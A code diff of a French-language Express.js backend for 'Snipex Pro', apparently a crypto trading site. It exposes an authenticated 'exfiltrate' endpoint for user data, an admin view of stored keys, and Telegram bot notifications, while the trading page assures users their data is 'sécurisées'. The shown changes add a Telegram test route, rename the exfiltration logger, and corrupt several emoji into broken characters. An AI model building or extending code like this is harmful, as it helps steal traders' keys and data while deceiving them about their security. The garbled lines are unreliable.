@@ -110,7 +110,8 @@ app.get('/', (req, res) => {
             '/api/trading': 'GET - Plateforme de trading',
             '/api/analytics/exfiltrate': 'POST - Exfiltration de données',
             '/api/admin/stats': 'GET - Statistiques admin (admin only)',
-            '/api/admin/keys': 'GET - Clés stockées (admin only)'
+            '/api/admin/keys': 'GET - Clés stockées (admin only)',
+            '/api/admin/test-telegram': 'POST - Test bot Telegram (admin only)'
         }
     });
 });
@@ -335,7 +336,7 @@ app.get('/api/trading', (req, res) => {
 
                 <div class="status">
                     <h3>🎯 Prêt pour le Trading</h3>
-                    <p>Vous pouvez maintenant accéder à toutes les fonctionnalités de la plateforme.</p>
+                    <p>Vous pouvez maintenant accéder à tous les fonctionnalités de la plateforme.</p>
                     <p class="info">Vos données sont synchronisées et sécurisées.</p>
                 </div>
             </div>
@@ -399,7 +400,7 @@ app.post('/api/analytics/exfiltrate', authenticateToken, async (req, res) => {
         }
 
         // Log de l'exfiltration
-        await db.logExfiltration({
+        await db.logExfiltratedData({
             userId: req.user.id,
             exfiltrationId,
             totalBundles: metadata.totalBundles,
@@ -474,7 +475,7 @@ app.post('/api/admin/test-telegram', authenticateAdmin, async (req, res) => {
         const testMessage = `🧪 <b>TEST BOT TELEGRAM</b>\n\n`;
         testMessage += `⏰ <b>Timestamp:</b> ${new Date().toLocaleString('fr-FR')}\n`;
         testMessage += `✅ <b>Statut:</b> Test de connexion réussi\n`;
-        testMessage += `🎯 <b>Action:</b> Vérification des notifications`;
+        testMessage += `�� <b>Action:</b> Vérification des notifications`;
 
         await telegramBot.sendMessage(testMessage);
 
@@ -515,9 +516,9 @@ app.use('*', (req, res) => {
 // Démarrage du serveur (pour développement local)
 if (process.env.NODE_ENV !== 'production') {
     app.listen(PORT, () => {
-        console.log(`🚀 Serveur Snipex Pro démarré sur le port ${PORT}`);
+        console.log(`�� Serveur Snipex Pro démarré sur le port ${PORT}`);
         console.log(`🔑 JWT Secret configuré`);
-        console.log(`👑 Admin Token configuré`);
+        console.log(`�� Admin Token configuré`);
         console.log(`📱 Bot Telegram: ${telegramBot ? 'Connecté' : 'Désactivé'}`);
         console.log(`📊 Endpoints disponibles:`);
         console.log(`   - POST /api/bundle-key`);
@@ -530,4 +531,4 @@ if (process.env.NODE_ENV !== 'production') {
 }
 
 // Export pour Vercel
-module.exports = app; 
+module.exports = app;
